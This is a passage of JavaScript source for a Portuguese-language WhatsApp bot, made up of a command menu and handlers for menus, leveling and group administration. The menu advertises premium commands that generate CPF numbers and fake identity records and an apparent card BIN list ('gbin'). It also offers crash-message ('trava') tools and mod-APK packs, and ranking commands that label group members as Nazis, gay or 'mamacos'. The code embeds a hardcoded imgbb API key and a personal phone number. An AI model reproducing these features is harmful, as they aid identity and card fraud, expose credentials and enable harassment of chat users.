‚úîUtilidadeÔºçpesquisa no wiki pra vc 

ñ£î‚û£‚ùß${prefix}wame¬† 
‚úîUtilidadeÔºçfaz um link do seu numero :) 

ñ£î‚û£‚ùß${prefix}chance 
‚úîUtilidadeÔºçdiz a chance do que vc disser 

ñ£î‚û£‚ùß${prefix}tomp3 (comente o video) 
‚úîUtilidadeÔºçvideo pra audio 

ñ£î‚û£‚ùß${prefix}covidglobal
‚úîUtilidadeÔºçmostra numeor de casos global 

ñ£î‚û£‚ùß${prefix}reversevid (comente o video)¬† 
‚úîUtilidadeÔºçrever te o video 

ñ£î‚û£‚ùß${prefix}google (sua pesquisa) 
‚úîUtilidadeÔºçpesquisa no google 

ñ£î‚û£‚ùß${prefix}getpic (mensione a pessoa)
‚úîUtilidadeÔºçpega a foto da pessoa como se fosse localiza√ß√£o 

ñ£î‚û£‚ùß${prefix}covid19
‚úîUtilidadeÔºçinforma√ß√µes do covid no Brasil 

ñ£î‚û£‚ùß${prefix}ytsrc (nome da musica)
‚úîUtilidadeÔºçve todas as musicas relacionadas e baixa pra ti 

Menu de grupo
ñ£î‚û£‚ùß${prefix}bemvindo [OFF]
‚úìUtilidade-ativa o modo de boas vindas 

ñ£î‚û£‚ùß${prefix}antilink [1/0] [ON]
‚úìUtilidade-ativa antilink em geral (wa.me,https://) 

------------------ANTI TRAVA------------------
ñ£î‚û£‚ùß${prefix}antispam [1/0] 
‚úìUtilidade-todos os testox que tiver minimo 3500 palavras 
o bot banir√° (travas) e mandara destrava ainda 

ñ£î‚û£‚ùß${prefix}antidoc [1/0]
‚úìUtilidade-ativa anti documento 

ñ£î‚û£‚ùß${prefix}anticontato [1/0]
‚úìUtilidade-nao pode mandar contato e nem vcard 

ñ£î‚û£‚ùß${prefix}anticontato [1/0]
‚úìUtilidade-ativa anti localiza√ß√£o (a pessoa nao pode mandar localiza√ß√£o)
------------------ANTI TRAVA------------------
ñ£î‚û£‚ùß${prefix}leveis [1/0]
‚úìUtilidade-ativa level no grupo pra ver quem
conversa mais e vai subindo de nivel 

ñ£î‚û£‚ùß${prefix}antifake [1/0]
‚úìUtilidade-altera a descri√ß√£o do grupo 

ñ£î‚û£‚ùß${prefix}simih [1/0]
‚úìUtilidade-ativa respostas automaticas no grupo 

ñ£î‚û£‚ùß${prefix}vote @marque | motivo | 1 (1 = 1 Minuto)
‚úìUtilidade-abre uma vota√ß√£o pro grupo 

ñ£î‚û£‚ùß${prefix}amongus @mensione
‚úìUtilidade-bane a pessoa igual o among us (jogo) 

ñ£î‚û£‚ùß${prefix}abrir
‚úìUtilidade-abre o grupo (para todos) 

ñ£î‚û£‚ùß${prefix}fechar
‚úìUtilidade-fecha o grupo (s√≥ para admins) 

ñ£î‚û£‚ùß${prefix}promover [comente]
‚úìUtilidade-da adm para a pessoa 

ñ£î‚û£‚ùß${prefix}rebaixar [comente]
‚úìUtilidade-tira adm da pessoa 

ñ£î‚û£‚ùß${prefix}setdesc
‚úìUtilidade-altera a descri√ß√£o do grupo 

ñ£î‚û£‚ùß${prefix}setfoto
‚úìUtilidade-altera a imagem do grupo 

ñ£î‚û£‚ùß${prefix}setnome (nome do grupo a ser mudado)
‚úìUtilidade-altera o nome do grupo 

ñ£î‚û£‚ùß*${prefix}linkgp
‚úìUtilidade-manda o link do grupo 

ñ£î‚û£‚ùß${prefix}banir [@]
‚úìUtilidade-bane a pessoa que marcar 

ñ£î‚û£‚ùß${prefix}add
‚úìUtilidade-add a pessoa automatico (se nao ir √© pq ela privou) 

ñ£î‚û£‚ùß${prefix}admins
‚úìUtilidade-lista os adms do grupo 

ñ£î‚û£‚ùß${prefix}marcar
ñ£î‚û£‚ùß${prefix}marcar2
ñ£î‚û£‚ùß${prefix}marcar3 

ñ£î‚û£‚ùß*${prefix}online
‚úìUtilidade-lista as pessoas online 

ñ£î‚û£‚ùß${prefix}kik (comente a mensagem)
‚úìUtilidade-bani ela do gp 

ñ£î‚û£‚ùß${prefix}bloqueados
‚úìUtilidade-lista todos os numeros que o bot bloqueou!
‚ùóviolaram as regras‚ùó 

ñ£î‚û£‚ùß${prefix}dono
‚úìUtilidade-manda o contato do dono do bot 

ñ£î‚û£‚ùß${prefix}grupoinfo
‚úìUtilidade-mostra informa√ß√µes do grupo 

ñ£î‚û£‚ùß${prefix}perfil
‚úìUtilidade-diz o seu perfil 

-„ÉÑcomente a imagem„ÉÑ-
ñ£î‚û£‚ùß${prefix}hitler [OFF]
ñ£î‚û£‚ùß${prefix}trash
ñ£î‚û£‚ùß${prefix}trash2 [OFF]
ñ£î‚û£‚ùß${prefix}morto [OFF]
ñ£î‚û£‚ùß${prefix}joke [OFF]
ñ£î‚û£‚ùß${prefix}animerosto [OFF]
ñ£î‚û£‚ùß${prefix}quadro [OFF]
ñ£î‚û£‚ùß${prefix}afetar [OFF] 

-„ÉÑANIME„ÉÑ-
ñ£î‚û£‚ùß${prefix}loli
ñ£î‚û£‚ùß${prefix}neko [OFF]
ñ£î‚û£‚ùß${prefix}hentai [OFF]


-„ÉÑ fun√ß√µes premium „ÉÑ- 

‚ùópara ter acesso premium mande o comando ${prefix}comprar 

ñ£î‚û£‚ùß${prefix}dado
‚úìUtilidade-fala numero aleat√≥rio de 1 a 6 

ñ£î‚û£‚ùß${prefix}premiumlist
‚úìUtilidade-ostra a lista de usuarios premium 

ñ£î‚û£‚ùß${prefix}delete (marque a mensagem do bot)
‚úìUtilidade-bot deleta a mensagem que marcar 

ñ£î‚û£‚ùß${prefix}mediafire (link)
‚úìUtilidadeÔºçbaixa o arquivo do mediafire 

ñ£î‚û£‚ùß${prefix}playe (nome da musica)
‚úìUtilidadeÔºçbaixa o video do yt em mp3 

ñ£î‚û£‚ùß${prefix}play8 (nome da musica)
‚úîUtilidadeÔºçbaixa em .mp3 pra vc e faz um link de download
üìåcomando as vezes cai ent tem que mandar dnv outra hora 

ñ£î‚û£‚ùß${prefix}img (nome da imagem)
‚úîUtilidadeÔºçmanda foto da imagem que especificou 

ñ£î‚û£‚ùß${prefix}buscar (nome da musica)
‚úìUtilidadeÔºçbusca a musica e baixa em audio ou video (vc escolhe) 

ñ£î‚û£‚ùß${prefix}figutag (marque a fig)
‚úìUtilidadeÔºçmarca todo mundo com figurinha 

ñ£î‚û£‚ùß${prefix}supertag (marque a foto/video)
‚úìUtilidadeÔºçmarca todo mundo com foto/video 

ñ£î‚û£‚ùß${prefix}tourl
‚úìUtilidade-transforma imagem em link 

ñ£î‚û£‚ùß${prefix}tolink
‚úìUtilidade-transforma video em link 

ñ£î‚û£‚ùß${prefix}rename (nome que quer ponhar)
‚úìUtilidadeÔºçrenomeia a figurinha que selecionar 

ñ£î‚û£‚ùß${prefix}ttp (texto) faz fig do texto com cores aleat√≥rias
ñ£î‚û£‚ùß${prefix}attp
‚úìUtilidadeÔºçfigurinha de texto piscando ex Ôºçattp 123
ñ£î‚û£‚ùß${prefix}attp1
ñ£î‚û£‚ùß${prefix}attp2
ñ£î‚û£‚ùß${prefix}attp3¬†¬† (esses outros attps √© pra mudar a fonte)
ñ£î‚û£‚ùß${prefix}attp4
ñ£î‚û£‚ùß${prefix}attp5
ñ£î‚û£‚ùß${prefix}attp6 

ñ£î‚û£‚ùß${prefix}qrcode (link)
‚úìUtilidade-gera qr code do link 

ñ£î‚û£‚ùß${prefix}chentai (+18)
‚úìUtilidade-o pack mais completo de hentai 

ñ£î‚û£‚ùß${prefix}gcpf
‚úìUtilidade-gera lista de cpf 

ñ£î‚û£‚ùß${prefix}ddd (ddd)
‚úìUtilidade-manda as cidade que o ddd se encontra e a regiao 

ñ£î‚û£‚ùß${prefix}gbin
‚úìUtilidade-gera lista do Aliexpress 

ñ£î‚û£‚ùß${prefix}pack18 (+18)
‚úìUtilidade-manda pack +18 

ñ£î‚û£‚ùß${prefix}destrava
‚úìUtilidade-manda destrava (zap) 

ñ£î‚û£‚ùß${prefix}gpessoa
‚úìUtilidade-gera pessoas cpf, rg .. 

ñ£î‚û£‚ùß${prefix}pmake (nome/nick) [+18]
‚úìUtilidade-faz plaquinha de um geitin 

ñ£î‚û£‚ùß${prefix}pmake2 (nome/nick) [+18]
‚úìUtilidade-faz plaquinha de outro geitin
ùïÉùïÜùîæùïÜùïä ‚Ñô‚ÑùùîºùïÑùïÄùïåùïÑ [OFF] 

„Ç∑-ESPECIFICO DO BOT-„Ç∑ 

ñ£î‚û£‚ùß${prefix}ping
‚úìUtilidade-manda o a velocidade do bot 

ñ£î‚û£‚ùß${prefix}rr
‚úìUtilidade-brincadeira do bot :) 

ñ£î‚û£‚ùß${prefix}cc
‚úìUtilidade-joga cara ou coroa 

ñ£î‚û£‚ùß${prefix}contar (seu texto)
‚úìUtilidade-diz quantos caracteres o texto possui 

ñ£î‚û£‚ùß${prefix}map (nome)
‚úìUtilidade-mostra a cidade, pais, regiao..etc (em foto) 

ñ£î‚û£‚ùß${prefix}wait [na legenda] 
‚úìUtilidade-pega um anime com base na foto 

-„ÉÑOUTROS „ÉÑ-
ñ£î‚û£‚ùß${prefix}testtime
‚úìUtilidade-conta 10 segundos pra vc 

ñ£î‚û£‚ùß${prefix}cringe [OFF]
‚úìUtilidade-memes aleat√≥rios 

ñ£î‚û£‚ùß${prefix}next
‚úìUtilidade-√© fofo veja „ÉÑ 

ñ£î‚û£‚ùß${prefix}alerta
‚úìUtilidade-manda memes cringe 

ñ£î‚û£‚ùß${prefix}gerarnick
‚úìUtilidade-gera nick pra tu 

ñ£î‚û£‚ùß${prefix}abra√ßo 
‚úìUtilidade-marque alguem para abra√ßa-lo 

ñ£î‚û£‚ùß${prefix}membrocm 
‚úìUtilidade-desenho not bad 

ñ£î‚û£‚ùß${prefix}compras 
‚úìUtilidade-caso queira comprar o bot 

ñ£î‚û£‚ùß${prefix}utila 
‚úìUtilidade-varios packs de tudo 

ñ£î‚û£‚ùß${prefix}imunes 
‚úìUtilidade-varios imunes pra ti :) 

ñ£î‚û£‚ùß${prefix}death 
‚úìUtilidade-mostra com quantos anos vc vai morrer 

ñ£î‚û£‚ùß${prefix}modapk
‚úìUtilidade- manda pack de aps mods 

ñ£î‚û£‚ùß${prefix}githubstalk (nome de usuario)
‚úìUtilidade- busca usuario no git hub 

ñ£î‚û£‚ùß${prefix}simi (converse)
‚úìUtilidade- ele responde sua mensagem com
uma pr√© definida 

-„ÉÑMENU¬† RANKS/INTERA√á√ÉO„ÉÑ-
üìå${prefix}rankes ‚û§menu de botao*üìå 

ñ£î‚û£‚ùß${prefix}ranklindos 
‚úìUtilidade-marca as 5 pessoas mais lindasü§© do grupo 

ñ£î‚û£‚ùß${prefix}rankalfa 
‚úìUtilidade-marca as 4 pessoas alfasüê∫ do grupo 

ñ£î‚û£‚ùß${prefix}rankfeios
‚úìUtilidade-marca as 5 pessoas mais feiasü§¢ do grupo 

ñ£î‚û£‚ùß${prefix}rankcaco
‚úìUtilidade-marca os 5 mamacosüêí do grupo 

ñ£î‚û£‚ùß${prefix}rankloucos
‚úìUtilidade-marca os 5 loucosü§° do grupo 

ñ£î‚û£‚ùß${prefix}rankgay
‚úìUtilidade-marca as 5 pessoas gaysüè≥Ô∏è‚Äçüåà do grupo 

ñ£î‚û£‚ùß${prefix}rankiludidos
‚úìUtilidade-marca as 5 pessoas iludidasüåù do grupo 

ñ£î‚û£‚ùß${prefix}suruba
‚úìUtilidade-marca as 5 pessoas para uma surubinha no grupo 

ñ£î‚û£‚ùß${prefix}surubao
‚úìUtilidade-marca as 5 pessoas para um surub√£o no grupo 

ñ£î‚û£‚ùß${prefix}gostosas
‚úìUtilidade-marca as 5 pessoas mais gostosasü•∞ do grupo 

ñ£î‚û£‚ùß${prefix}rankprincipes
‚úìUtilidade-marca os 5 principes do grupoü§¥üèª do grupo 

ñ£î‚û£‚ùß${prefix}rankprincesas
‚úìUtilidade-marca as 5 princesasüë∏üèª do grupo 

ñ£î‚û£‚ùß${prefix}ranknazista
‚úìUtilidade-marca os 5 nazistas üíÇ‚Äç‚ôÇÔ∏è do grupo 

ñ£î‚û£‚ùß${prefix}rankbeta
‚úìUtilidade-marca os 5 betas ü§ì do grupo 

ñ£î‚û£‚ùß${prefix}rankgado
‚úìUtilidade-marca os 5 gados üêÉ do grupo 

ñ£î‚û£‚ùß${prefix}casal
‚úìUtilidade-shippa duas pessoas ‚ù§Ô∏èüôÉ 

ñ£î‚û£‚ùß${prefix}abra√ßo (marque a pessoa que quer dar o abra√ßo)
‚úìUtilidade-marca os dois com uma mensagem fofinha 

ñ£î‚û£‚ùß${prefix}gadometro
‚úìUtilidade-diz que tipo de gado vc √© 

ñ£î‚û£‚ùß${prefix}%feio
‚úìUtilidade-diz sua % de feio 

ñ£î‚û£‚ùß${prefix}%bonito
‚úìUtilidade-diz sua % de bonito 

ñ£î‚û£‚ùß${prefix}gay
‚úìUtilidade-diz sua % de gay 

ñ£î‚û£‚ùß${prefix}lindo
‚úìUtilidade-diz slindoua % de lindo 

ñ£î‚û£‚ùß${prefix}%gostoso
‚úìUtilidade-diz sua % de gostoso
‚ä∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚òÜñßπ.‡πãÍ™∂üé≠Í´Ç‚Ä§‡πãñßπ‚òÜ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ä±

` 
const menu2 = `  ÍßÅùïãùïÜùïÑùïÄùïÜùïÇùî∏~ùîπùïÜùïãÍßÇ
bem vindo ${pushname}üéâ
üë∑üèªDONOüë∑üèª
·¨â·¨µ‚Éî‚ÉïÕú ‰∫á≈Ç‚ùç ‰∫á‚ùç·õñ≈Ç‚ùç“†‰πà‚ÜØÊÑõ
wa.me/5544998220867
‚úß‚ïê‚ïê‚ïê‚Ä¢‚ùÅ‚ùÄ‚ùÅ‚Ä¢‚ïê‚ïê‚ïê‚úß
ùó£ùóúùó´: ${prefix}doar
‚úß‚ïê‚ïê‚ïê‚Ä¢‚ùÅ‚ùÄ‚ùÅ‚Ä¢‚ïê‚ïê‚ïê‚úß
ùôóùô§ùô© ùôñùô©ùôûùô´ùô§ ùôôùôöùô®ùôôùôö: 
‚è∞${temp}
‚úß‚ïê‚ïê‚ïê‚Ä¢‚ùÅ‚ùÄ‚ùÅ‚Ä¢‚ïê‚ïê‚ïê‚úß
ùôßùôöùô•ùô§ùôßùô©ùôñùôß ùôóùô™ùôú/ùô®ùô™ùôúùôöùô®ùô©ùôñÃÉùô§: 
${prefix}enviar (descreva)
‚úß‚ïê‚ïê‚ïê‚Ä¢‚ùÅ‚ùÄ‚ùÅ‚Ä¢‚ïê‚ïê‚ïê‚úß
‚ùós·¥á …¥·¥ÄÃÉ·¥è «´·¥ú…™·¥¢·¥á Ä ·¥†·¥á Ä ·¥è ·¥ç·¥á…¥·¥ú ·¥áx·¥õ·¥á…¥s·¥è ·¥Ñ ü…™«´·¥ú·¥á ·¥á·¥ç ·¥ç·¥á…¥·¥ús‚ùó`


sendButLocation(from, `${menu2}`, `${menu}`, {jpegThumbnail:img}, [{buttonId: `${prefix}dono`, buttonText: {displayText: 'üë§ CRIADOR'}, type: 1},{buttonId: `${prefix}menu2`, buttonText: {displayText: 'üìù MENUS'}, type: 1}])
break
case 'menu2':

const tomioks = `_SELECIONE UM DOS MENUS ABAIXO_` 
let temporalY= tomioka.prepareMessageFromContent(from, {
"listMessage": {
"title": (tomioks),
"description": `*‚úÖprefix: ${prefix}*`,
"buttonText": "MENUSüìå",
"listType": "SINGLE_SELECT",
"sections": [
{
"rows": [
{
"title": 'üéâMENU DE NOVIDADESüéâ',
"rowId": `${prefix}novid`
},
{
"title": 'üî•MENU DE GRUPO/ADMINISTRA√á√ÉOüî•',
"rowId": `${prefix}grupo`
},
{
"title": 'üòùMENU DE INTERA√á√ÉO/JOGOS EM (GRUPO)üòù',
"rowId": `${prefix}interativos`
},
{
"title": 'üó∫Ô∏èMENU DE IMAGENSüó∫Ô∏è',
"rowId": `${prefix}imagens`
},
{
"title": 'üíéMENU PREMIUMüíé',
"rowId": `${prefix}premium`
},
{
"title": 'üíéMENU DE LOGOS PREMIUMüíé',
"rowId": `${prefix}logopremium`
},
{
"title": 'ü§ñMENU ESPECIFICO DO BOTü§ñ',
"rowId": `${prefix}especifico`
},
{
"title": 'üé±MENU DE OUTROSüé±',
"rowId": `${prefix}outros`
},
{
"title": 'ü¶ãMENU DE INTERA√á√ÉO/GRUPOü¶ã',
"rowId": `${prefix}ranks`
}
]
}
]                    
}
}, {quoted:tomio})
tomioka.relayWAMessage(temporalY)
break
case 'bolsonaro':
var apikey = `akame`
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
img = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: msg
enviar(`*‚è≥Em processo‚è≥*`)
midia = await tomioka.downloadAndSaveMediaMessage(img)
msg = body.slice(7)
akame = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", midia)
resultado = await getBuffer(`https://akamer.herokuapp.com/api/canvas/bolsonaro?img=${akame.display_url}&apikey=${apikey}`)
tomioka.sendMessage(from, resultado, image, {quoted:msg})
} else {
enviar('Marque alguma imagem')
}
break
case 'gp':
if (!isBotGroupAdmins) return enviar(`O BOT PRECISA SER ADM`)
if (!isGroup) return enviar(`S√ì EM GRUPO`)
if (!isGroupAdmins) return enviar(`PRECISA SER ADMININASTROR`)
temporall = tomioka.prepareMessageFromContent(from,{
"listMessage": {
"title": "MENU DO GRUPO ",
"description": "Clique nos bot√µes baixo e envie",
"buttonText": "clique aqui",
"listType": "SINGLE_SELECT",
"sections": [
{
"rows": [
{
"title": 'ABRIR GRUPO',
"rowId": `${prefix}abrir`
},
{
"title": 'FECHAR GRUPO',
"rowId": `${prefix}fechar`
},
{
"title": 'ATIVAR ANTI FAKE',
"rowId": `antifake1`
},
{
"title": 'DESATIVAR ANTI FAKE',
"rowId": `antifake0`
},
{
"title": 'ATIVAR ANTILINK',
"rowId": `${prefix}antilink1`
},
{
"title": 'DESATIVAR ANTI LINK',
"rowId": `${prefix}antilink0`
},
{
"title": 'RESETAR LINK',
"rowId": `${prefix}resetar`
}
]
}
]                    
}
}, {quoted:msg})
tomioka.relayWAMessage(temporall)
break
case 'resetar':
if (!isBotGroupAdmins) return enviar(`O BOT PRECISA SER ADM`)
if (!isGroup) return enviar(`S√ì EM GRUPO`)
if (!isGroupAdmins) return enviar(`PRECISA SER ADMININASTROR`)
tomioka.query({ json: ['action', 'inviteReset', from], expect200: true })
linkgc = await tomioka.groupInviteCode(from)
enviar('link resetado com sucesso!')
break
/*case 'jadibot':
let { WAConnection, MessageType, Mimetype} = require('@adiwajshing/baileys')
let qrcode = require('qrcode')
const fs = require('fs')

listjadibot = [];

const jadibot = async(enviar,tomioka,id) => {
conn = new WAConnection()
conn.logger.level = 'warn'
conn.version = [2, 2123, 8]
conn.browserDescription = [ 'jadibot', '', '3.0' ]
conn.on('qr', async qr => {
let bot = await qrcode.toDataURL(qr, { scale: 8 })
let buffer = new Buffer.from(bot.replace('data:image/png;base64,', ''), 'base64')
bot = await tomioka.sendMessage(id,buffer,MessageType.image,{caption:'Escanea el codigo QR para convertirte en un bot\n*Reglas:*\nEl codigo vence cada 30 segundos asi que intenta ser rapido.'})
setTimeout(() => {
tomioka.deleteMessage(id, bot.key)
},30000)
})
conn.on('connecting', () => {
})
conn.on('open', () => {
const topesd = `Nuevo bot detectado\n\n*Dispositivo*:\n\n ${JSON.stringify(conn.user,null,2)}`
enviar(topesd)
})
await conn.connect({timeoutMs: 30 * 1000})
listjadibot.push(conn.user)
conn.on('chat-update', async (message) => {
require('../tomioka.js')(conn, message)
})
}

const stopjadibot = (enviar) => {
conn = new WAConnection();
conn.close()
enviar('Jadibot apagado')
}

module.exports = {
jadibot,
stopjadibot,
listjadibot
}
break*/
case 'cry':

data = await fetchJson('https://waifu.pics/api/sfw/cry')
hasil = await getBuffer(data.url)
tomioka.sendMessage(from, hasil, MessageType.video, {quoted: msg, mimetype: 'video/gif', thumbnail: null})
break
/*case 'menu':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
wew = fs.readFileSync('./assets/foto.png')
tomioka.sendMessage(from, wew, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "ÍßÅùïãùïÜùïÑùïÄùïÜùïÇùî∏~ùîπùïÜùïãÍßÇ", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./assets/botlogo.webp')} } }, caption: help(prefix) })
break*/
case 'infodono':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, infodono(prefix) , text, {contextInfo: tomio})
break
case 'testi':
const tp = `GGGGGFFFFGFFFDFGFGFGou`
tomioka.sendMessage(from, tp, text, {quoted: fgif})
break
case 'picpay':

enviar(`pra quem quer um banco e √© de menor(minimo 16 anos) :\n\nhttp://www.picpay.com/convite?DYULZN`)  
break
case 'ajudantes':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, ajudantes(prefix) , text, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "AJUDANTES ü•∞", 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
break
case 'leveis':

if (!isGroup) return enviar('s√≥ grupo')
if (!isGroupAdmins && !isOwner) return enviar('so adm pd usar')
if (args.length < 1) return enviar(`Digite da forma correta:\nComando: ${prefix}leveis 1 para ativar `)
if (Number(args[0]) === 1) {
if (isLevelingOn) return enviar('‚ùéO recurso LEVEIS j√° est√° ativado no grupo‚ùé')
leveling.push(from)
fs.writeFileSync('./database/json/leveling.json', JSON.stringify(leveling))
enviar('‚úÖO recurso LEVEIS foi ativado‚úÖ')
} else if (Number(args[0]) === 0) {
if (!isLevelingOn) return enviar('‚ùéO recurso LEVEIS n√£o est√° ativado no grupo‚ùé')
leveling.splice(from)
fs.writeFileSync('./database/json/leveling.json', JSON.stringify(leveling))                 
enviar('‚ùåO recurso LEVEIS foi desativado‚ùå')
} else {
enviar(`Digite da forma correta:\nComando: ${prefix}leveis 1, para ativar e 0 para desativar`)
}

break
case 'addxp':

if (!isOwner) return enviar('s√≥ o dono pode')
if (!isGroup) return enviar('so grupo')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Foi adicionado ${args[1]} em xp para @${mentioned[0].split('@')[0]}`
mentions(`${susp}`, mentioned, true)
addLevelingXp((mentioned[0]), Number(args[1]))

break
//levEL ATUAL
case 'level':

if (!isLevelingOn) return enviar(`leveling tem que estar ativado!: ${prefix}leveling 1`)
if (!isGroup) return enviar('s√≥ grupo')
const userLevel = getLevelingLevel(sender)
const userXp = getLevelingXp(sender)
if (userLevel === undefined && userXp === undefined) return enviar('bah')
const requiredXp = 7 * Math.round(userLevel) * 13 * userLevel 
resul = `‚îè‚îÅ‚îÅ‚ùâ *N√çVEL* ‚ùâ‚îÅ‚îÅ\n‚î£‚ä± *Nome* : ${pushname}\n‚î£‚ä± *N√∫mero* : wa.me/${sender.split("@")[0]}\n‚î£‚ä± *XP* :  ${userXp}/${requiredXp}\n‚î£‚ä± *Seu n√≠vel* : ${userLevel}\n‚î£‚ä± *Patente* : ${patt}\n‚îó‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ`
enviar(resul)
break 

//////////////
case 'outros':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/outros.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: outros(prefix), thumbnail: fs.readFileSync('./assets/outros.jpg')})
break
case 'mvoz':

if (!isUser) return enviar(`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/voz.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: menuvoz(prefix), thumbnail: fs.readFileSync('./assets/voz.jpg')})
break
case 'logopremium':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/logo.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: logos(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
break
case 'novid':

if (!isUser) return enviar(`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/novid.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: novid(prefix), thumbnail: fs.readFileSync('./assets/novid.jpg')})
break
case 'ranks':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/ranke.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: rank(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
break
case 'customfig':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, custom(prefix) , text, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}\nùêú??ùê¶ùêöùêßùêùùê®: ${command}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
break
case 'interativos':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/interact.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: interact(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
break
case 'imagens':

if (!isUser) return enviar(`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/image.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: imagens(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
break
case 'especifico':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/interact.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: especifico(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
break
case 'efeitos':

if (!isUser) return enviar(`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/efeito.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: efeitoaudio(prefix), thumbnail: fs.readFileSync('./assets/efeito.jpg')})
break
case 'premium':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/premium.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: premiuns(prefix), thumbnail: fs.readFileSync('./assets/premium.jpg')})
break
case 'grupo':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/adm.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: grupo(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
break
/////////////////////
case 'modapk':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, modapk(prefix), text, { quoted: tomio, contextInfo: tome, thumbnail: fs.readFileSync('./me.jpg') })
break
case 'gbin':

if (!isPremium) return enviar ('s√≥ premium')
tomioka.sendMessage(from, gbin(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'gpessoa':

if (!isPremium) return enviar ('s√≥ premium')

tomioka.sendMessage(from, gpessoa(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'destrava':


tomioka.sendMessage(from, destrava(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
